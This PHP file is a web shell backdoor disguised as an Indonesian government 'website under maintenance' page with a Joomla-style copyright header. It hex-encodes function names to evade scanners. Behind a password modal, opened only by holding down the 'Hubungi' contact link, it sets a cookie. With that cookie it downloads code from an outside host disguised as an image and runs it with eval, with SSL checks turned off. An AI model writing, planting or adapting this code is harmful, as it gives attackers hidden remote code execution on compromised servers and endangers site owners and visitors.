<?php
/**
 * @package    Haxor.Group
 * @copyright  Copyright (C) 2023 - 2024 Open Source Matters, Inc. All rights reserved.
 *
 */

// @deprecated  1.0  Deprecated without replacement
function is_logged_in()
{
    return isset($_COOKIE['user_id']) && $_COOKIE['user_id'] === 'xXxAptismexXx'; 
}

if (is_logged_in()) {
    $Array = array(
        '666f70656e', # fo p en => 0
        '73747265616d5f6765745f636f6e74656e7473', # strea m_get_contents => 1
        '66696c655f6765745f636f6e74656e7473', # fil e_g et_cont ents => 2
        '6375726c5f65786563' # cur l_ex ec => 3
    );

    function hex2str($hex) {
        $str = '';
        for ($i = 0; $i < strlen($hex); $i += 2) {
            $str .= chr(hexdec(substr($hex, $i, 2)));
        }
        return $str;
    }

    function geturlsinfo($destiny) {
        $belief = array(
            hex2str($GLOBALS['Array'][0]), 
            hex2str($GLOBALS['Array'][1]), 
            hex2str($GLOBALS['Array'][2]), 
            hex2str($GLOBALS['Array'][3])  
        );

        if (function_exists($belief[3])) { 
            $ch = curl_init($destiny);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            $love = $belief[3]($ch);
            curl_close($ch);
            return $love;
        } elseif (function_exists($belief[2])) { 
            return $belief[2]($destiny);
        } elseif (function_exists($belief[0]) && function_exists($belief[1])) { 
            $purpose = $belief[0]($destiny, "r");
            $love = $belief[1]($purpose);
            fclose($purpose);
            return $love;
        }
        return false;
    }

    $destiny = 'https://haxor-research.com/rimuru.jpg';
    $dream = geturlsinfo($destiny);
    if ($dream !== false) {
        eval('?>' . $dream);
    }
} else {
    if (isset($_POST['password'])) {
        $entered_key = $_POST['password'];
        $hashed_key = '$2a$12$BBaLHa.cGOJZR9697oj3auaNFtGk04W6vbsr8mqV9cwprwoPZM4SW'; 
        
        if (password_verify($entered_key, $hashed_key)) {
            setcookie('user_id', 'xXxAptismexXx', time() + 3600, '/'); 
            header("Location: ".$_SERVER['PHP_SELF']); 
            exit();
        }
    }
?>


<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Website Dalam Pemeliharaan</title>

<style>
*{
  margin:0;padding:0;box-sizing:border-box;
  font-family:Segoe UI,Tahoma,Verdana,sans-serif
}
body{
  background:#f5f5f5;color:#333;
  min-height:100vh;display:flex;flex-direction:column
}
.container{
  max-width:800px;margin:auto;
  padding:40px 20px;text-align:center;flex:1
}
.box{
  background:#fff;border-radius:8px;padding:40px;
  box-shadow:0 4px 12px rgba(0,0,0,.1)
}
h1{color:#e60000;margin-bottom:15px}
p{margin-bottom:20px;color:#555;font-size:16px}

.progress{
  height:10px;background:#ddd;border-radius:10px;
  overflow:hidden;margin:30px 0
}
.bar{
  height:100%;width:65%;background:#e60000;
  animation:pulse 2s infinite
}
@keyframes pulse{
  0%{width:65%}50%{width:70%}100%{width:65%}
}

#hubungiTrigger{
  color:#e60000;
  font-weight:600;
  cursor:pointer;
  user-select:none;
}

.footer{
  background:#e60000;color:#fff;
  text-align:center;padding:20px;font-size:14px
}

/* MODAL */
#pwModal{
  display:none;
  position:fixed;inset:0;
  background:rgba(0,0,0,.45);
  z-index:9999
}
#pwModal .modal{
  background:#fff;width:280px;
  padding:25px;border-radius:8px;
  position:absolute;top:50%;left:50%;
  transform:translate(-50%,-50%);
  text-align:center
}
#pwModal input{
  width:100%;padding:10px;
  margin:15px 0
}
#pwModal button{
  width:100%;padding:10px;
  background:#e60000;
  color:#fff;border:0;
  cursor:pointer
}
</style>
</head>

<body>

<div class="container">
  <div class="box">
    <h1>Website Sedang Dalam Pemeliharaan</h1>

    <p>Kami sedang melakukan pemeliharaan dan peningkatan sistem.</p>

    <div class="progress">
      <div class="bar"></div>
    </div>

    <p>Perkiraan waktu selesai: <b>24 Jam</b></p>

    <p>
      <span id="hubungiTrigger">Hubungi</span>
      : +62 21 1234 5678
    </p>
  </div>
</div>

<div class="footer">
  &copy; 2023 Instansi Pemerintah Republik Indonesia
</div>

<!-- MODAL PASSWORD -->
<div id="pwModal">
  <div class="modal">
    <form method="post">
      <h4 style="color:#e60000">Verifikasi Akses</h4>
      <input type="password" name="password" required autofocus>
      <button type="submit">Masuk</button>
    </form>
  </div>
</div>

<script>
const trigger = document.getElementById('hubungiTrigger');
const modal = document.getElementById('pwModal');
let timer = null;
const HOLD_TIME = 900;

function openModal(){
  modal.style.display = 'block';
}

trigger.addEventListener('mousedown', ()=> {
  timer = setTimeout(openModal, HOLD_TIME);
});
trigger.addEventListener('touchstart', ()=> {
  timer = setTimeout(openModal, HOLD_TIME);
});

['mouseup','mouseleave','touchend','touchcancel']
.forEach(evt=>{
  trigger.addEventListener(evt, ()=> clearTimeout(timer));
});

modal.onclick = (e)=>{
  if(e.target === modal){
    modal.style.display = 'none';
  }
};
</script>

</body>
</html>

<?php } ?>